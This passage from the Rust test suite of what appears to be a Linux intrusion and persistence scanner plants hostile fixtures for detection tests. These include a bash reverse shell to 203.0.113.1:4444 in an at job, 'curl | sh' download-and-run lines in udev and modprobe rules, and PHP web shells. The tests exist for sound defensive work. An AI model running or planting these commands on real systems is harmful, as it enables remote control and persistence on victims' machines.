    inv.connections.push(conn("tcp", 4444, "mystery"));
    inv.connections.push(conn("tcp", 50000, "mystery"));
    let (f, _) = baseline::compare(&base, &inv, &["net_proc".to_string()]);
    assert_eq!(f.len(), 1);
    assert_eq!(f[0].severity, Severity::High);
    assert!(f[0].title.contains("tcp/4444") && f[0].title.contains("tcp/50000"), "{}", f[0].title);
}

#[test]
fn an_incomplete_baseline_is_completed_after_a_clean_root_scan() {
    use scanner::autobaseline::{auto_save_to, AutoBaseline};
    use scanner::report::Report;
    let dir = tempfile::tempdir().expect("tempdir");
    let path = dir.path().join("baseline.json");
    let mut quick = Report { running_as_root: true, scan_root: "/".into(), modules: vec!["net_proc".into(), "persistence".into()], ..Report::default() };
    quick.finalize();
    Baseline::from_report(&quick).save(&path).expect("save");
    let mut full = Report { running_as_root: true, scan_root: "/".into(), modules: ModuleId::CORE.iter().map(|m| m.id().to_string()).collect(), ..Report::default() };
    full.finalize();
    match auto_save_to(&full, &path) {
        AutoBaseline::Completed(_, parts) => assert_eq!(parts, vec!["proc_audit".to_string(), "fs_perms".to_string(), "desktop_session".to_string()]),
        other => panic!("{other:?}"),
    }
    assert!(Baseline::load(&path).expect("load").modules.iter().any(|m| m == "fs_perms"));
    assert_eq!(auto_save_to(&full, &path), AutoBaseline::NotNeeded, "complete now");
}

#[test]
fn several_updated_programs_become_one_restart_finding() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    for (pid, exe) in [(300u32, "/usr/libexec/flatpak-session-helper"), (301, "/usr/bin/firefox-esr"), (302, "/home/x/payload")] {
        write(root, &format!("/proc/{pid}/stat"), &format!("{pid} (x) S 1 0 0 0 -1 4194560 0 0\n"));
        write(root, &format!("/proc/{pid}/status"), &format!("Name:\tx\nTgid:\t{pid}\nPPid:\t1\nUid:\t1000\t1000\t1000\t1000\n"));
        write(root, &format!("/proc/{pid}/cmdline"), &format!("{exe}\0"));
        symlink(format!("{exe} (deleted)"), root.join(format!("proc/{pid}/exe"))).expect("exe");
    }
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::ProcAudit]), &|_| {});
    let deleted: Vec<_> = report.findings.iter().filter(|f| f.rule == "PROC-DELETED").collect();
    assert_eq!(deleted.len(), 2, "{deleted:?}");
    let grouped = deleted.iter().find(|f| f.title.contains("need a restart")).expect("grouped");
    assert!(grouped.title.contains("flatpak-session-helper") && grouped.title.contains("firefox-esr"), "{}", grouped.title);
    assert!(deleted.iter().any(|f| f.title.contains("/home/x/payload")));
}

#[test]
fn library_path_in_tmp_is_flagged_but_normal_ones_are_not() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/ld.so.conf", "include /etc/ld.so.conf.d/*.conf\n");
    write(root, "/etc/ld.so.conf.d/x86_64-linux-gnu.conf", "# Multiarch\n/usr/local/lib/x86_64-linux-gnu\n/lib/x86_64-linux-gnu\n");
    write(root, "/etc/ld.so.conf.d/zz.conf", "/dev/shm/.lib\n");
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Persistence]), &|_| {});
    let f: Vec<_> = report.findings.iter().filter(|f| f.rule == "PERS-LDCONF").collect();
    assert_eq!(f.len(), 1, "{f:?}");
    assert_eq!(f[0].severity, Severity::High);
    assert!(f[0].evidence.contains("zz.conf:1: /dev/shm/.lib"));
}

#[test]
fn files_an_older_version_did_not_track_are_not_high_and_get_added() {
    use scanner::autobaseline::{auto_save_to, AutoBaseline};
    use scanner::report::Report;
    let dir = tempfile::tempdir().expect("tempdir");
    let path = dir.path().join("baseline.json");
    let core: Vec<String> = ModuleId::CORE.iter().map(|m| m.id().to_string()).collect();
    let mut old = Report { running_as_root: true, scan_root: "/".into(), version: "0.2.0".into(), modules: core.clone(), ..Report::default() };
    old.finalize();
    Baseline::from_report(&old).save(&path).expect("save");

    let mut inv = scanner::modules::Inventory::default();
    inv.persistence_files.insert("/etc/ld.so.conf".into(), "abc".into());
    let mut base = Baseline::load(&path).expect("load");
    base.scanner_version = "0.2.0".into();
    let (f, _) = baseline::compare(&base, &inv, &core);
    assert_eq!(f.len(), 1);
    assert_eq!(f[0].severity, Severity::Low, "new to the baseline, not suspicious");

    let mut now = Report { running_as_root: true, scan_root: "/".into(), modules: core, inventory: inv, ..Report::default() };
    now.finalize();
    base.save(&path).expect("save");
    assert!(matches!(auto_save_to(&now, &path), AutoBaseline::Completed(..)));
    let after = Baseline::load(&path).expect("load");
    assert!(after.persistence_files.contains_key("/etc/ld.so.conf"));
    assert_eq!(after.scanner_version, env!("CARGO_PKG_VERSION"));
}

#[test]
fn libvirt_dnsmasq_is_not_an_unknown_listener() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let hdr = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n";
    write(root, "/proc/net/udp", &format!("{hdr}   0: 00000000:0043 00000000:0000 07 00000000:00000000 00:00000000 00000000 65534        0 800 1 0 100 0 0 10 0\n"));
    write(root, "/proc/1621/stat", "1621 (dnsmasq) S 1 0 0 0 -1 4194560 0 0\n");
    write(root, "/proc/1621/status", "Name:\tdnsmasq\nTgid:\t1621\nPPid:\t1\nUid:\t65534\t65534\t65534\t65534\n");
    write(root, "/proc/1621/cmdline", "/usr/sbin/dnsmasq\0--conf-file=/var/lib/libvirt/dnsmasq/default.conf\0");
    symlink("/usr/sbin/dnsmasq", root.join("proc/1621/exe")).expect("exe");
    fs::create_dir_all(root.join("proc/1621/fd")).expect("fd");
    symlink("socket:[800]", root.join("proc/1621/fd/4")).expect("sock");
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::NetProc]), &|_| {});
    assert!(!report.has_rule("NET-LISTEN-UNKNOWN"), "{:?}", report.findings);
}

#[test]
fn lynis_suggestions_are_listed_and_many_debsums_docs_are_grouped() {
    let f = parse_lynis("", "suggestion[]=AUTH-9286|Configure minimum password age|\nsuggestion[]=BOOT-5264|Harden the boot service|\n");
    assert!(f[0].evidence.contains("AUTH-9286: Configure minimum password age"), "{}", f[0].evidence);
    let g = parse_debsums("/usr/share/doc/a/x\n/usr/share/doc/b/y\n/usr/share/doc/c/z\n/usr/bin/ls\n", "");
    assert_eq!(g.len(), 2, "one program finding + one grouped finding");
    assert!(g.iter().any(|x| x.severity == Severity::Critical && x.title.contains("/usr/bin/ls")));
    assert!(g.iter().any(|x| x.title.contains("3 documentation/data files")));
    assert_eq!(parse_debsums("/usr/share/doc/a/x\n", "").len(), 1, "a single file stays as it is");
}

#[test]
fn an_old_whitelist_gets_new_defaults_but_keeps_the_persons_changes() {
    use scanner::config_update::{update_file, Update};
    let dir = tempfile::tempdir().expect("tempdir");
    let path = dir.path().join("whitelist.toml");
    // as written by an older version: no browsers, an own entry and a comment
    fs::write(
        &path,
        "# my own comment\nallowed_listen_processes = [\n    \"avahi-daemon\",\n    \"my-own-service\",\n]\nallowed_listen_ports = [\"tcp/22\", \"tcp/8123\"]\nreport_loopback_listeners = true\n",
    )
    .expect("write");

    // loading already applies the new defaults, without touching the file
    let loaded = Config::load(&path).expect("load");
    assert!(loaded.allowed_listen_processes.iter().any(|p| p == "firefox-esr"));
    assert!(fs::read_to_string(&path).expect("read").starts_with("# my own comment"));
    assert!(!fs::read_to_string(&path).expect("read").contains("firefox-esr"));

    // updating writes them, keeps comment, own entries and settings, and saves a backup
    let Update::Added { entries, backup } = update_file(&path).expect("update") else { panic!("expected additions") };
    assert!(entries.iter().any(|e| e == "allowed_listen_processes: firefox-esr"), "{entries:?}");
    assert!(backup.exists());
    let text = fs::read_to_string(&path).expect("read");
    assert!(text.contains("# my own comment") && text.contains("my-own-service") && text.contains("tcp/8123"), "{text}");
    let cfg = Config::load(&path).expect("load");
    assert!(cfg.report_loopback_listeners, "own settings kept");
    assert!(cfg.allowed_listen_processes.iter().any(|p| p == "firefox-esr"));
    assert!(cfg.allowed_pam_modules.iter().any(|p| p == "pam_wtmpdb"), "missing lists are added");
    assert_eq!(update_file(&path).expect("again"), Update::UpToDate);

    // an entry the person removes stays removed
    let without = fs::read_to_string(&path).expect("read").replace("\"firefox-esr\",", "");
    fs::write(&path, without).expect("write");
    assert_eq!(update_file(&path).expect("update"), Update::UpToDate);
    assert!(!Config::load(&path).expect("load").allowed_listen_processes.iter().any(|p| p == "firefox-esr"));
}

#[test]
fn whitelist_updates_can_be_switched_off_and_a_missing_file_is_created() {
    use scanner::config_update::{update_file, Update};
    let dir = tempfile::tempdir().expect("tempdir");
    let off = dir.path().join("off.toml");
    fs::write(&off, "add_new_defaults = false\nallowed_listen_ports = [\"tcp/22\"]\n").expect("write");
    assert_eq!(update_file(&off).expect("update"), Update::SwitchedOff);
    assert_eq!(Config::load(&off).expect("load").allowed_listen_ports, vec!["tcp/22".to_string()]);

    let new = dir.path().join("etc/scanner/whitelist.toml");
    assert_eq!(update_file(&new).expect("create"), Update::Created);
    assert_eq!(Config::load(&new).expect("load"), Config::default());
    assert_eq!(update_file(&new).expect("again"), Update::UpToDate);

    let broken = dir.path().join("broken.toml");
    fs::write(&broken, "allowed_listen_ports = oops").expect("write");
    assert!(update_file(&broken).is_err());
    assert_eq!(fs::read_to_string(&broken).expect("read"), "allowed_listen_ports = oops", "a broken file is never rewritten");
}

#[test]
fn login_lines_are_parsed_and_cannot_be_spoofed_by_user_names() {
    use scanner::modules::auth_logs::{parse_line, Kind};
    let e = parse_line("2026-11-25T10:00:00+0100 laptop sshd-session[12]: Failed password for invalid user oracle from 198.51.100.7 port 5000 ssh2").expect("ssh");
    assert_eq!((e.kind, e.user.as_str(), e.source.as_str()), (Kind::SshFailed, "oracle", "198.51.100.7"));
    let e = parse_line("Nov 25 10:00:01 laptop sshd[13]: Accepted publickey for anna from 192.168.1.5 port 22 ssh2: ED25519 SHA256:x").expect("accepted");
    assert_eq!(e.kind, Kind::SshAccepted { method: "publickey".into() });
    assert_eq!(e.time, "Nov 25 10:00:01");
    // a user name made to look like a success is still an invalid-user attempt from the real address
    let e = parse_line("2026-11-25T10:00:02+0100 h sshd[1]: Invalid user x Accepted password for root from 10.0.0.1 from 198.51.100.9 port 1").expect("spoof");
    assert_eq!(e.kind, Kind::SshInvalidUser);
    assert_eq!(e.source, "198.51.100.9");
    let e = parse_line("2026-11-25T10:00:03+0100 h sudo[2]:     bob : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls").expect("wrong password");
    assert_eq!((e.kind, e.user.as_str()), (Kind::SudoWrongPassword { attempts: 3 }, "bob"));
    let e = parse_line("2026-11-25T10:00:04+0100 h sudo:  eve : user NOT in sudoers ; TTY=pts/1 ; USER=root ; COMMAND=/bin/sh").expect("denied");
    assert_eq!(e.kind, Kind::SudoDenied);
    let e = parse_line("2026-11-25T10:00:05+0100 h su[3]: FAILED SU (to root) bob on pts/0").expect("switch user");
    assert_eq!(e.kind, Kind::SuFailed { target: "root".into() });
    let e = parse_line("2026-11-25T10:00:06+0100 h sddm-helper[4]: pam_unix(sddm:auth): authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=  user=anna").expect("desktop");
    assert_eq!((e.kind, e.user.as_str()), (Kind::LocalFailed { service: "sddm".into() }, "anna"));
    // SSH PAM lines are not counted twice; ordinary lines are ignored
    assert!(parse_line("2026-11-25T10:00:07+0100 h sshd[5]: pam_unix(sshd:auth): authentication failure; user=x").is_none());
    assert!(parse_line("2026-11-25T10:00:08+0100 h CRON[6]: pam_unix(cron:session): session opened for user root").is_none());
    assert!(parse_line("garbage").is_none());
}

#[test]
fn login_findings_have_sensible_levels() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let mut log = String::new();
    for i in 0..3 {
        log.push_str(&format!("2026-11-25T09:00:0{i}+0100 h sshd[1]: Failed password for anna from 192.168.1.20 port 1 ssh2\n"));
    }
    log.push_str("2026-11-25T09:01:00+0100 h sshd[1]: Accepted password for anna from 192.168.1.20 port 1 ssh2\n");
    log.push_str("2026-11-25T09:02:00+0100 h sudo[2]: bob : 1 incorrect password attempt ; TTY=pts/0 ; USER=root ; COMMAND=/bin/ls\n");
    write(root, "/var/log/auth.log", &log);
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::AuthLogs]), &|_| {});
    assert!(!report.has_rule("AUTH-SSH-SUCCESS-AFTER-FAIL"), "three typos then success is normal");
    assert!(!report.has_rule("AUTH-SSH-BRUTEFORCE"));
    let low: Vec<_> = report.findings.iter().filter(|f| f.rule == "AUTH-SSH-FAILED" || f.rule == "AUTH-SUDO-FAILED").collect();
    assert_eq!(low.len(), 2, "{:?}", report.findings);
    assert!(low.iter().all(|f| f.severity == Severity::Low));

    // many guesses and then a success is critical
    for i in 0..20 {
        log.push_str(&format!("2026-11-25T10:00:{i:02}+0100 h sshd[1]: Failed password for root from 203.0.113.5 port 1 ssh2\n"));
    }
    log.push_str("2026-11-25T10:05:00+0100 h sshd[1]: Accepted password for root from 203.0.113.5 port 1 ssh2\n");
    write(root, "/var/log/auth.log", &log);
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::AuthLogs]), &|_| {});
    assert_eq!(report.findings[0].rule, "AUTH-SSH-SUCCESS-AFTER-FAIL");
    assert_eq!(report.findings[0].severity, Severity::Critical);
    assert!(report.has_rule("AUTH-SSH-BRUTEFORCE") && report.has_rule("AUTH-SSH-ROOT-PASSWORD"));
}

#[test]
fn no_login_log_is_a_note_not_a_crash() {
    let dir = tempfile::tempdir().expect("tempdir");
    let report = run_scan(&SysRoot::new(dir.path()), &Config::default(), &opts(&[ModuleId::AuthLogs]), &|_| {});
    assert!(report.findings.is_empty());
    assert!(report.notes.iter().any(|n| n.contains("no login log")), "{:?}", report.notes);
}

fn rules(report: &scanner::Report) -> Vec<String> {
    report.findings.iter().map(|f| format!("{} {:?} {}", f.rule, f.severity, f.title)).collect()
}

fn found<'a>(report: &'a scanner::Report, rule: &str) -> &'a scanner::Finding {
    report.findings.iter().find(|f| f.rule == rule).unwrap_or_else(|| panic!("no {rule} in {:#?}", rules(report)))
}

#[test]
fn kernel_modules_and_settings() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/modules", "ext4 1000 1 - Live 0x0\nnvidia 100 0 - Live 0x0 (POE)\nevil_driver 10 0 - Live 0x0 (OE)\ndiamorphine 10 0 - Live 0x0 (OE)\n");
    for m in ["ext4", "nvidia", "evil_driver", "diamorphine", "ghost"] {
        write(root, &format!("/sys/module/{m}/initstate"), "live\n");
    }
    write(root, "/sys/module/printk/parameters/x", "1"); // built in: no initstate
    write(root, "/proc/sys/kernel/core_pattern", "|/tmp/.x %p\n");
    write(root, "/proc/sys/kernel/modprobe", "/sbin/modprobe\n");
    write(root, "/proc/sys/kernel/randomize_va_space", "0\n");
    write(root, "/etc/modprobe.d/x.conf", "install dummy /bin/true\ninstall net-pf-10 curl -s http://x/y | sh\n");
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Kernel]), &|_| {});
    assert!(found(&report, "KERN-MODULE-HIDDEN").title.contains("ghost"));
    assert_eq!(found(&report, "KERN-ROOTKIT-NAME").severity, Severity::Critical);
    let untrusted = found(&report, "KERN-MODULE-UNTRUSTED");
    assert!(untrusted.evidence.contains("evil_driver") && !untrusted.evidence.contains("nvidia"), "{}", untrusted.evidence);
    assert!(report.findings.iter().any(|f| f.rule == "KERN-SYSCTL" && f.title.contains("core_pattern") && f.severity == Severity::Critical));
    assert!(report.findings.iter().any(|f| f.rule == "KERN-SYSCTL" && f.title.contains("randomize_va_space")));
    assert!(!report.findings.iter().any(|f| f.title.contains("kernel.modprobe")), "the default modprobe path is fine");
    assert_eq!(report.findings.iter().filter(|f| f.rule == "KERN-MODPROBE-CMD").count(), 1);
}

#[test]
fn network_extras_dns_hosts_arp_routes_and_outbound() {
    use scanner::modules::netwatch::is_public;
    assert!(is_public(&"203.0.113.9".parse().expect("ip")) && !is_public(&"192.168.1.1".parse().expect("ip")) && !is_public(&"100.111.1.1".parse().expect("ip")));
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let hdr = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n";
    let line = |i: u32, remote: &str, inode: u32| {
        let r: SocketAddr = remote.parse().expect("addr");
        format!("   {i}: {} {} 01 00000000:00000000 00:00000000 00000000     0        0 {inode} 1 0 100 0 0 10 0\n", encode_hex_addr(&"10.0.0.2:45000".parse().expect("addr")), encode_hex_addr(&r))
    };
    write(root, "/proc/net/tcp", &format!("{hdr}{}{}{}", line(0, "93.184.216.34:6881", 901), line(1, "93.184.216.34:443", 902), line(2, "45.33.1.1:53", 903)));
    write(root, "/proc/700/stat", "700 (agent) S 1 0 0 0 -1 4194560 0 0\n");
    write(root, "/proc/700/status", "Name:\tagent\nTgid:\t700\nPPid:\t1\nUid:\t0\t0\t0\t0\n");
    write(root, "/proc/700/cmdline", "/opt/agent/agent\0");
    symlink("/opt/agent/agent", root.join("proc/700/exe")).expect("exe");
    fs::create_dir_all(root.join("proc/700/fd")).expect("fd");
    for (n, inode) in [(3, 901), (4, 902), (5, 903)] {
        symlink(format!("socket:[{inode}]"), root.join(format!("proc/700/fd/{n}"))).expect("sock");
    }
    write(root, "/etc/resolv.conf", "nameserver 192.168.1.1\nnameserver 185.1.2.3\n");
    write(root, "/etc/hosts", "127.0.0.1 localhost\n6.6.6.6 deb.debian.org security.debian.org\n");
    write(root, "/proc/net/route", "Iface\tDestination\tGateway\tFlags\tRefCnt\tUse\tMetric\tMask\tMTU\tWindow\tIRTT\neth0\t00000000\t0100000A\t0003\t0\t0\t100\t00000000\t0\t0\t0\n");
    write(root, "/proc/net/arp", "IP address       HW type     Flags       HW address            Mask     Device\n10.0.0.1         0x1         0x2         aa:bb:cc:dd:ee:ff     *        eth0\n10.0.0.66        0x1         0x2         aa:bb:cc:dd:ee:ff     *        eth0\n");
    write(root, "/sys/class/net/eth0/flags", "0x1103\n");
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::NetProc]), &|_| {});
    let out = found(&report, "NET-OUTBOUND-UNUSUAL");
    assert!(out.evidence.contains("6881") && !out.evidence.contains(":443"), "{}", out.evidence);
    found(&report, "NET-DNS-DIRECT");
    assert!(found(&report, "NET-RESOLVER").evidence.contains("185.1.2.3"));
    assert_eq!(found(&report, "NET-HOSTS-OVERRIDE").severity, Severity::High);
    assert_eq!(found(&report, "NET-ARP-DUPLICATE").severity, Severity::High, "gateway MAC reused");
    found(&report, "NET-PROMISC");
    assert!(!report.has_rule("NET-ROUTE-DEFAULT"));
}

#[test]
fn udev_at_jobs_keys_and_account_changes() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path().join("root");
    write(&root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\n");
    write(&root, "/etc/group", "root:x:0:\nsudo:x:27:\nwww-data:x:33:\n");
    write(&root, "/etc/shadow", "root:$y$abc:1::\nwww-data:*:1::\n");
    let sys = SysRoot::new(&root);
    let o = opts(&[ModuleId::Persistence]);
    let first = run_scan(&sys, &Config::default(), &o, &|_| {});
    let base = dir.path().join("baseline.json");
    Baseline::from_report(&first).save(&base).expect("save");

    write(&root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nwww-data:x:33:33::/var/www:/bin/bash\neve:x:1001:1001::/home/eve:/bin/bash\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n");
    write(&root, "/etc/group", "root:x:0:\nsudo:x:27:www-data\nwww-data:x:33:\n");
    write(&root, "/etc/shadow", "root:$y$abc:1::\nwww-data:$y$new:1::\neve:$y$x:1::\n_apt:*:1::\n");
    write(&root, "/etc/udev/rules.d/99-x.rules", "ACTION==\"add\", RUN+=\"/bin/sh -c 'curl http://x/y | sh'\"\n");
    write(&root, "/var/spool/cron/atjobs/a0001", "#!/bin/sh\nexport HOME='/home/x'\ncd /home/x\nbash -i >& /dev/tcp/203.0.113.1/4444 0>&1\n");
    write(&root, "/etc/ssl/private/server.key", "key");
    fs::set_permissions(root.join("etc/ssl/private/server.key"), fs::Permissions::from_mode(0o644)).expect("chmod");
    let report = run_scan(&sys, &Config::default(), &ScanOptions { baseline_compare: Some(base), ..o }, &|_| {});
    let new: Vec<_> = report.findings.iter().filter(|f| f.rule == "BASE-ACCOUNT-NEW").collect();
    assert!(new.iter().any(|f| f.title.contains("eve") && f.severity == Severity::High), "{new:?}");
    assert!(new.iter().any(|f| f.title.contains("_apt") && f.severity == Severity::Low), "{new:?}");
    assert_eq!(found(&report, "BASE-ACCOUNT-SHELL").severity, Severity::Critical);
    assert!(found(&report, "BASE-ACCOUNT-GROUP").evidence.contains("sudo"));
    found(&report, "BASE-ACCOUNT-PASSWORD");
    assert_eq!(found(&report, "PERS-UDEV").severity, Severity::Critical);
    assert_eq!(found(&report, "PERS-AT-CMD").severity, Severity::Critical);
    assert_eq!(found(&report, "PERS-KEY-PERMS").severity, Severity::High);
}

#[test]
fn web_shells_and_container_access() {
    use scanner::modules::services::webshell_pattern;
    assert!(webshell_pattern("<?php eval ( $_POST['x'] ); ?>").is_some());
    assert!(webshell_pattern("<?php echo htmlspecialchars($_GET['q']); ?>").is_none());
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/var/www/html/index.php", "<?php echo 'hi'; ?>");
    write(root, "/var/www/html/uploads/.x.php", "<?php system($_REQUEST['c']); ?>");
    write(root, "/var/www/html/notes.txt", "eval($_POST['x'])");
    write(root, "/run/docker.sock", "");
    fs::set_permissions(root.join("run/docker.sock"), fs::Permissions::from_mode(0o666)).expect("chmod");
    write(root, "/proc/900/stat", "900 (sh) S 1 0 0 0 -1 4194560 0 0\n");
    write(root, "/proc/900/status", "Name:\tsh\nTgid:\t900\nUid:\t0\t0\t0\t0\nCapEff:\t000001ffffffffff\n");
    write(root, "/proc/900/cgroup", "0::/system.slice/docker-abc.scope\n");
    write(root, "/proc/900/mountinfo", "1 2 0:1 /run/docker.sock /var/run/docker.sock rw - tmpfs tmpfs rw\n");
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Services]), &|_| {});
    assert_eq!(report.findings.iter().filter(|f| f.rule == "SVC-WEBSHELL").count(), 1, "{:#?}", rules(&report));
    assert_eq!(found(&report, "SVC-WEBSHELL").severity, Severity::Critical);
    assert_eq!(found(&report, "SVC-CONTAINER-SOCKET").severity, Severity::Critical);
    found(&report, "SVC-CONTAINER-PRIVILEGED");
    found(&report, "SVC-CONTAINER-SOCKET-MOUNT");
}

#[test]
fn log_and_time_integrity_and_account_events() {
    use scanner::modules::auth_logs::{parse_line, Kind};
    use scanner::modules::integrity::{backward_jumps, utmp_damage};
    assert_eq!(utmp_damage(&[1u8; 384 * 2]), (false, 0));
    assert_eq!(utmp_damage(&[0u8; 384 + 10]), (true, 1));
    assert_eq!(backward_jumps("2026-01-02T10:00:00+01:00 a\n2026-01-02T08:00:00+01:00 b\n").len(), 1);
    assert!(backward_jumps("2026-01-02T10:00:00+01:00 a\n2026-01-02T09:59:00+01:00 b\n").is_empty());
    let e = parse_line("2026-01-02T10:00:00+01:00 h useradd[1]: new user: name=eve, UID=1001, GID=1001, home=/home/eve, shell=/bin/bash, from=none").expect("useradd");
    assert_eq!((e.kind, e.user.as_str()), (Kind::Created { what: "user" }, "eve"));
    let e = parse_line("2026-01-02T10:00:01+01:00 h usermod[2]: add 'eve' to group 'sudo'").expect("usermod");
    assert_eq!(e.kind, Kind::GroupAdded { group: "sudo".into() });
    let e = parse_line("2026-01-02T10:00:02+01:00 h gpasswd[3]: user eve added by root to group docker").expect("gpasswd");
    assert_eq!(e.kind, Kind::GroupAdded { group: "docker".into() });

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    fs::create_dir_all(root.join("home/eve")).expect("mkdir");
    symlink("/dev/null", root.join("home/eve/.bash_history")).expect("link");
    write(root, "/var/log/auth.log", "2026-01-02T10:00:00+01:00 h usermod[2]: add 'eve' to group 'sudo'\n2026-01-02T06:00:00+01:00 h CRON[1]: x\n");
    fs::write(root.join("var/log/wtmp"), [0u8; 100]).expect("wtmp");
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Integrity, ModuleId::AuthLogs]), &|_| {});
    found(&report, "INT-LOG-DEVNULL");
    found(&report, "INT-TIME-BACKWARDS");
    assert_eq!(found(&report, "INT-WTMP").severity, Severity::Medium);
    assert_eq!(found(&report, "AUTH-GROUP-ADD").severity, Severity::Medium);
}

#[test]
fn logs_are_read_four_weeks_back_and_no_further() {
    use scanner::modules::common::{log_line_time, recent_lines};
    assert_eq!(Config::default().log_days, 28);
    let reference = chrono::NaiveDate::from_ymd_opt(2026, 1, 10).expect("date").and_hms_opt(12, 0, 0).expect("time");
    assert_eq!(log_line_time("Dec 30 10:00:00 h sshd[1]: x", reference).map(|t| t.format("%Y-%m-%d").to_string()), Some("2025-12-30".into()), "old syslog lines get the right year");
    assert!(log_line_time("2026-01-09T10:00:00.123456+01:00 h x", reference).is_some());
    assert!(log_line_time("2026-01-09T10:00:00+0100 h x", reference).is_some());
    let lines = vec![
        "2026-10-01T10:00:00+01:00 h sshd[1]: old",
        "2026-10-29T10:00:00+01:00 h sshd[1]: just inside",
        "Nov 20 10:00:00 h sshd[1]: classic",
        "2026-11-25T10:00:00+01:00 h sshd[1]: newest",
    ];
    let kept = recent_lines(lines, 28, false);
    assert_eq!(kept.len(), 3, "{kept:?}");
    assert!(!kept.iter().any(|l| l.ends_with(": old")));

    // a failed login from five weeks before the newest line is not reported
    let dir = tempfile::tempdir().expect("tempdir");
    write(
        dir.path(),
        "/var/log/auth.log",
        "2026-10-15T09:00:00+0100 h su[3]: FAILED SU (to root) oldtimer on pts/0\n2026-11-25T09:00:00+0100 h su[4]: FAILED SU (to root) anna on pts/0\n",
    );
    let report = run_scan(&SysRoot::new(dir.path()), &Config::default(), &opts(&[ModuleId::AuthLogs]), &|_| {});
    let titles: Vec<&str> = report.findings.iter().map(|f| f.title.as_str()).collect();
    assert!(titles.iter().any(|t| t.contains("anna")) && !titles.iter().any(|t| t.contains("oldtimer")), "{titles:?}");
}

#[test]
fn updates_module_is_skipped_for_a_test_root() {
    let dir = tempfile::tempdir().expect("tempdir");
    let report = run_scan(&SysRoot::new(dir.path()), &Config::default(), &opts(&[ModuleId::Updates]), &|_| {});
    assert!(report.notes.iter().any(|n| n.contains("updates")), "{:?}", report.notes);
    assert!(report.findings.is_empty());
}

#[test]
fn whitelist_knows_nvidia_and_wtmpdb() {
    let cfg = Config::default();
    assert!(cfg.is_suid_allowed("/usr/bin/nvidia-modprobe"));
    assert!(cfg.allowed_pam_modules.iter().any(|m| m == "pam_wtmpdb"));
}

// ------------------------------------------------------------ the whole sandbox

#[test]
fn sandbox_self_test_triggers_every_rule() {
    let res = sandbox::run_self_test(&|_| {}).expect("self-test");
    let failed: Vec<&str> = res.checks.iter().filter(|c| !c.passed).map(|c| c.rule.as_str()).collect();
    assert!(failed.is_empty(), "rules that did not fire: {failed:?}");
    assert!(res.report.findings.windows(2).all(|w| w[0].severity >= w[1].severity));
    assert!(res.report.findings.iter().all(|f| !f.verify.is_empty() || f.rule.starts_with("EXT-")), "every finding should have verification commands");
}
